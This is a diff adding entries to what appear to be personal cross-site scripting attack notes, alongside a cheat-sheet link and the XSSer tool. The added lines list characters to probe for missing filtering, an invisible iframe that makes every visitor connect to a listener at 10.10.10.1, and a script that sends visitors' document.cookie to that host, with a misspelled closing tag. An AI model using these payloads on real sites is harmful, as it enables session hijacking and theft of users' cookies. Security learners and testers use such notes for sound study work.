@@ -4,6 +4,18 @@ Cheat sheet: http://ha.ckers.org/xss.html
 
 Reflected, stored 
 
+# general special chars
+<>'"{};
+if those are not filtered or encoded then xss might possible
+
+# injecting visible iframe in payload
+is used to embedd other file (f.e.: html document, images) within the current html document
+// All users who visit this page with the iframe will connect to 10.10.10.1
+<iframe src=http://10.10.10.1/report height="0" width="0"> </iframe>
+//with netcat connect and you will see the users
+
+# stealing cookies
+<script>new Image().src="http://10.10.10.1/cool.jpg?output="+document.cookie; </scipt>
 
 # XSSer
 //start it with 
